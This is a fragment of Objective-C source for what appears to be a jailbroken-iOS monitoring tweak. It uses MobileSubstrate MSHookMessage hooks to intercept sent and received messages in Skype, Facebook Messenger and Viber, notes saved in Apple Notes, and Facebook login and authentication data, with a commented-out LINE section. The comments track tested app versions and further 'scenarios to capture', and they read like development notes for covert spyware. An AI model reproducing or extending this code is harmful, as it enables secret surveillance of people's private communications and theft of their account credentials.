		_ChatDAO$insertMessage$inChat$ = MSHookMessage(objc_getMetaClass("ChatDAO"), @selector(insertMessage:inChat:), &$ChatDAO$insertMessage$inChat$);		
		_ChatService$sendMessage$usingRequestSequence$whenFinished$errorBlock$ = MSHookMessage(objc_getMetaClass("ChatService"), @selector(sendMessage:usingRequestSequence:whenFinished$errorBlock: ), &$ChatService$sendMessage$usingRequestSequence$whenFinished$errorBlock$ );		
		 
		Class $TalkTextView(objc_getClass("TalkTextView"));
		_TalkTextView$insertText$ = MSHookMessage($TalkTextView, @selector(insertText:), &$TalkTextView$insertText$);				
		_TalkMessageObject$line_updateWithLineMessage$ = MSHookMessage($TalkMessageObject, @selector(line_updateWithLineMessage:), &$TalkMessageObject$line_updateWithLineMessage$);		
		_TalkMessageObject$insertWithMessage$reqSeq$inManagedObjectContext$ = MSHookMessage(objc_getMetaClass("TalkMessageObject"), @selector(insertWithMessage:reqSeq:inManagedObjectContext:), &$TalkMessageObject$insertWithMessage$reqSeq$inManagedObjectContext$);				 
		_TalkMessageObject$line_sendContent = MSHookMessage($TalkMessageObject, @selector(line_sendContent), &$TalkMessageObject$line_sendContent);				 
		_TalkMessageObject$line_uploadImage = MSHookMessage($TalkMessageObject, @selector(line_uploadImage), &$TalkMessageObject$line_uploadImage);	
		
		Class $_TalkChatObject(objc_getClass("_TalkChatObject"));
		__TalkChatObject$insertInManagedObjectContext$ = MSHookMessage($_TalkChatObject, @selector(insertInManagedObjectContext:), &$_TalkChatObject$insertInManagedObjectContext$);		 
		 
		Class $LineStickerPackage(objc_getClass("LineStickerPackage"));
		_LineStickerPackage$downloadImageForSticker$type$version$completionBlock$ = MSHookMessage($LineStickerPackage, @selector(downloadImageForSticker:type:version:completionBlock:), &$LineStickerPackage$downloadImageForSticker$type$version$completionBlock$) ;		
		 */
	}
	
#pragma mark -
#pragma mark skype, SkypeForiPad hook
#pragma mark -
	
	// Skype
	if ([identifier isEqualToString:@"com.skype.skype"] ||
		[identifier isEqualToString:@"com.skype.SkypeForiPad"]) {
		Class $SKConversation(objc_getClass("SKConversation"));
		_SKConversation$insertObject$inMessagesAtIndex$ = MSHookMessage($SKConversation, @selector(insertObject:inMessagesAtIndex:), &$SKConversation$insertObject$inMessagesAtIndex$);
		
		Class $SKConversationManager(objc_getClass("SKConversationManager"));
		_SKConversationManager$insertObject$inUnreadConversationsAtIndex$ = MSHookMessage($SKConversationManager, @selector(insertObject:inUnreadConversationsAtIndex:), &$SKConversationManager$insertObject$inUnreadConversationsAtIndex$);	
		
	}
	
#pragma mark -
#pragma mark mobilenotes hook
#pragma mark -
	
	// Note
	if ([identifier isEqualToString:@"com.apple.mobilenotes"]) {
		//if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad){
		if ([SystemUtilsImpl isIpad] || [SystemUtilsImpl isIpodTouch]) {
			DLog(@"I AM IPAD");
			// To capture activate for Ipad application
			Class $NotesDisplayController = objc_getClass("NotesDisplayController");
			//_NotesDisplayController$addButtonClicked$ = MSHookMessage($NotesDisplayController, @selector(addButtonClicked:), &$NotesDisplayController$addButtonClicked$);
			_NotesDisplayController$saveNote = MSHookMessage($NotesDisplayController, @selector(saveNote), &$NotesDisplayController$saveNote);
		}
	}
	
#pragma mark -
#pragma mark Messager, Facebook hook
#pragma mark -
	
	if ([identifier isEqualToString:@"com.facebook.Messenger"] ||
		[identifier isEqualToString:@"com.facebook.Facebook"]) {
		
		// Tested on Facebook 5.6, 6.0, 6.0.1, 6.0.2
		// Tested on Messenger 2.3.1
		
		// For outgoing/incoming message of existing thread (good network connection)
		Class $FBMThread(objc_getClass("FBMThread"));
		_FBMThread$addNewerMessage$ = MSHookMessage($FBMThread, @selector(addNewerMessage:), &$FBMThread$addNewerMessage$);
		
		// For outgoing message of existing thread
		Class $MQTTMessageSender = objc_getClass("MQTTMessageSender");
		// Send method, after this there will be a call (in case of send success) of addNewerMessage$/thread$didSendMessage$ 
		_MQTTMessageSender$sendMessage$thread$delegate$ = MSHookMessage($MQTTMessageSender, @selector(sendMessage:thread:delegate:), &$MQTTMessageSender$sendMessage$thread$delegate$);
		// Capture outgoing message of existing thread (bad network connection)
		_MQTTMessageSender$thread$didSendMessage$ = MSHookMessage($MQTTMessageSender, @selector(thread:didSendMessage:), &$MQTTMessageSender$thread$didSendMessage$);
		
		// For outgoing facebook message of newly created thread
		// For Messenger 2.3.1, if the thread is deleted on the server (via web user) after that client create new message to same persons in the deleted thread again;
		// client will use the same thread id which deleted from the server thus in this case this method and addNewerMessage$ are called and the result is duplicate the events (KNOWN ISSUE)
		// For Facebook 5.6, 6.0, 6.0.1, 6.0.2 this method is called because it have to request new thread id from server, however the newly request thread id is the same old one (deleted one)
		Class $BatchThreadCreator = objc_getClass("BatchThreadCreator");
		_BatchThreadCreator$request$didLoad$ = MSHookMessage($BatchThreadCreator, @selector(request:didLoad:), &$BatchThreadCreator$request$didLoad$);
		
		// For incoming facebook message of newly created thread (Helper)
		Class $ThreadsFetcher = objc_getClass("ThreadsFetcher");
		_ThreadsFetcher$request$didLoad$ = MSHookMessage($ThreadsFetcher, @selector(request:didLoad:), &$ThreadsFetcher$request$didLoad$);
		// Capture method by using helper above
		Class $FBThreadListController = objc_getClass("FBThreadListController");
		_FBThreadListController$didFetchThreads$ = MSHookMessage($FBThreadListController, @selector(didFetchThreads:), &$FBThreadListController$didFetchThreads$);
		
		/*
		 More scenario to capture
		 - Offline messages (while not login friends of user send message)
		 More issue to fix
		 - Rarely lost outgoing messages
		 - Rarely duplicate outgoing messages
		 */
		
		// Capture login user info
		// For messegner
		// Obsolete (does not work)
		//Class $FBSSOLoginController = objc_getClass("FBSSOLoginController");
		//_FBSSOLoginController$account = MSHookMessage($FBSSOLoginController, @selector(account), &$FBSSOLoginController$account);
		//_FBSSOLoginController$accountStore = MSHookMessage($FBSSOLoginController, @selector(accountStore), &$FBSSOLoginController$accountStore);
		Class $FBAuthenticationManagerImpl = objc_getClass("FBAuthenticationManagerImpl");
		_FBAuthenticationManagerImpl$initWithUsers$keychainProvider$userDefaults$ = MSHookMessage($FBAuthenticationManagerImpl, @selector(initWithUsers:keychainProvider:userDefaults:), &$FBAuthenticationManagerImpl$initWithUsers$keychainProvider$userDefaults$);
		_FBAuthenticationManagerImpl$initWithProviderMapData$ = MSHookMessage($FBAuthenticationManagerImpl, @selector(initWithProviderMapData:), &$FBAuthenticationManagerImpl$initWithProviderMapData$);
		// For facebook (class method hook)
		Class $FBMessengerModuleAuthenticationManager = objc_getMetaClass("FBMessengerModuleAuthenticationManager");
		_FBMessengerModuleAuthenticationManager$authenticationManagerWithSessionStore$ = MSHookMessage($FBMessengerModuleAuthenticationManager, @selector(authenticationManagerWithSessionStore:), &$FBMessengerModuleAuthenticationManager$authenticationManagerWithSessionStore$);
	}
	
#pragma mark -
#pragma mark Viber hook
#pragma mark -
	
	if ([identifier isEqualToString:@"com.viber"]) {
		Class $DBManager(objc_getClass("DBManager"));
		_DBManager$addSentMessage$conversation$seq$location$attachment$ = MSHookMessage($DBManager, @selector(addSentMessage:conversation:seq:location:attachment:), &$DBManager$addSentMessage$conversation$seq$location$attachment$);
		_DBManager$addReceivedMessage$conversationID$phoneNumber$seq$token$date$location$attachment$attachmentType$ = MSHookMessage($DBManager, @selector(addReceivedMessage:conversationID:phoneNumber:seq:token:date:location:attachment:attachmentType:), &$DBManager$addReceivedMessage$conversationID$phoneNumber$seq$token$date$location$attachment$attachmentType$);
		
	}
	
	DLog(@"MSFSP initialize end");
	[pool release];
}





